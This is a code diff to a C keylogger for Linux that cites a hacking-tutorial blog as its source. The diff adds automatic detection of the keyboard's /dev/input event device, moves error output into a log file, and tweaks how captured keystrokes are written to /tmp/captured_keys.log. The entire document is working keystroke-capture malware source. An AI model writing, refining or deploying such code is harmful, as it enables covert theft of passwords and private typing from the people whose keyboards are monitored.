@@ -1,12 +1,11 @@
-// https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
-// To Add:
-// Auto detect the event file
+// Source: https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <linux/input.h>
 #include <fcntl.h>
 #include <string.h>
+#define event_buf_len 50
 #define ERROR_PATH "/tmp/errors_keylogger.log"
 #define CAPTURE_PATH "/tmp/captured_keys.log"
 #define KEYLOG 1
@@ -20,29 +19,59 @@ typedef struct keys_s
 	FILE *file;
 } keys_t;
 
+int detect_path_event_file(char *event_file); 
 int create_socket(const char *event_path, FILE **file, int *fd, FILE **logs);
 int create_logs_files(FILE ** logs);
-int read_from_event4(struct input_event *ev, int fd);
+int read_from_eventX(struct input_event *ev, int fd);
 int	translate_keycode(unsigned short code, keys_t *keys);
 int	write_captured_key(FILE *file, const char *key);
+
+int detect_path_event_file(char *event_file)
+{
+	char relative_path[10];
+	unsigned short len;
+	char *last;
+	int size;
+
+	size = event_buf_len;
+	len = 10;
+	if (readlink("/dev/input/by-path/platform-i8042-serio-0-event-kbd", \
+					relative_path, len - 1) < 0)
+			return (0);
+		relative_path[len - 1] = '\0';
+		printf("ev: %s\n", relative_path);
+		last = stpncpy(event_file, "/dev/input/", size);
+		size -= 11;
+		strncpy(last, &relative_path[3], size);
+		size -= strlen(&relative_path[3]);
+		printf("full: %s\n", event_file);
+		return (1);
+}
 
 int main(void)
 {
 	struct input_event ev;
 	keys_t keys;
 	int fd;
+	char event_file[event_buf_len];
 	FILE *logs[2] = {NULL, NULL};
+
 
 	keys.size = LONGEST_KEY + 1;
 	ev.code = 0;
-	if (!create_socket("/dev/input/event4", &keys.file, &fd, logs))
+	if (!detect_path_event_file(event_file))
+	{
+		fprintf(stderr, "Problem with the readlink function\n");
+		return (1);
+	}
+	if (!create_socket(event_file, &keys.file, &fd, logs))
 		return (1);
 	while (ev.code != 1)
 	{
 		memset(&ev, 0, sizeof(ev));
-		if (!read_from_event4(&ev, fd))
+		if (!read_from_eventX(&ev, fd))
 		{
-			fprintf(stderr, "Unable to read in the fd of event4\n");
+			fprintf(logs[ERROR], "Unable to read in the fd of eventX\n");
 			break;
 		}
 		if (ev.type == EV_KEY && ev.value == 1)
@@ -66,20 +95,20 @@ int main(void)
 int create_socket(const char *event_path, FILE **file, int *fd, FILE *logs[])
 {
 	*fd = open(event_path, O_RDONLY);
-	if (*fd < 0)
-	{
-		fprintf(stderr, "Unable to read event4, is it in sudo ?\n");
-		return (0);
-	}
 	if (!create_logs_files(logs))
 	{
 		fprintf(stderr, "Unable to create log files\n");
 		return (0);
 	}
+	if (*fd < 0)
+	{
+		fprintf(logs[ERROR], "Unable to read event, is it in sudo ?\n");
+		return (0);
+	}
 	*file = fopen("./keys.dat", "r");
 	if (!*file)
 	{
-		fprintf(stderr, "Unable to read keys.dat file\n");
+		fprintf(logs[ERROR], "Unable to read keys.dat file\n");
 		return (0);
 	}
 	return (1);
@@ -104,7 +133,7 @@ int create_logs_files(FILE *logs[])
 	return (1);
 }
 
-int read_from_event4(struct input_event *ev, int fd)
+int read_from_eventX(struct input_event *ev, int fd)
 {
 	ssize_t n;
 
@@ -155,9 +184,10 @@ int	write_captured_key(FILE *file, const char *key)
 	{
 		if (fprintf(file, "\n") < 0)
 			return (0);
-		return (1);
 	}
-	if (fprintf(file, "%s", key) < 0)
-		return (0);
+	else
+		if (fprintf(file, "%s", key) < 0)
+			return (0);
+	fprintf(file, "%c", '|');
 	return (1);
 }
